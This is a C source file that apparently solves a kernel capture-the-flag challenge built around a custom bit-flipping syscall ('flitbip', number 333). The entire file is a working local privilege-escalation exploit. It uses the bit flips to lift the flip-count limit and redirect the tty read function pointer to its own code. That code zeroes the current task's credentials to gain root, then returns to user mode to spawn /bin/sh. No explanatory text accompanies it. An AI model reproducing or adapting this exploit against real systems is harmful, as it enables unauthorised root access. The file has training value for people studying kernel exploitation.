#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

unsigned long *flit_count = 0xffffffff818f4f78;
unsigned long *n_tty_ops = 0xffffffff8183e320;
unsigned long *n_tty_read = 0xffffffff810c8510;
unsigned long *n_tty_ops_read = 0xffffffff8183e320 +0x30;
unsigned long *current_task = 0xffffffff8182e040; 
unsigned long user_cs, user_ss, user_sp, user_rflags;

static void save_state()
{
    __asm__("movq %0, cs;\n"
            "movq %1, ss;\n"
            "movq %2, rsp;\n"
            "pushfq;\n"
            "popq %3;\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
            :
            : "memory"
    );
}

void get_shell()
{
    //setreuid(0, 0);
    system("/bin/sh");
}

static void shellcode()
{

    int *cred = *(unsigned long*)((char*)current_task + 0x3c0);
    *(unsigned long*)((char*)n_tty_ops_read) = (unsigned long)n_tty_read;
    
    for(int i=0; i<9; i++)
        ((unsigned int*)cred)[i] = 0;

    __asm__(
        "swapgs;"
        "mov rax, %0;"
        "push rax;"
        "mov rax, %1;"
        "push rax;"
        "mov rax, %2;"
        "push rax;"
        "mov rax, %3;"
        "push rax;"
        "mov rax, %4;"
        "push rax;"
        "iretq;"
        :
        : "r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs), "r"(get_shell)
        : "memory"
    );
}

void flitbip(long * addr, long bit)
{
    
    __asm__(
        "mov rax, 333;"
        "syscall;"
    );
    
    //syscall(333, addr, bit);
}

int main()
{
    char buf[0x200];
    unsigned long flipper;
    // save register info
    save_state();
    // overwrite flit_count -> bypass flip count limit
    flitbip((void*)flit_count, 63);
    
    // overwrite read 
    flipper = (unsigned long)n_tty_read ^ (unsigned long)shellcode;
   
    for(int i=0; i<64; i++)
    {
        if(flipper & (1ULL << (i)))
            flitbip((char*)n_tty_ops_read, i);
    }
    fgets(buf, sizeof(buf), stdin);
    return 0;

}
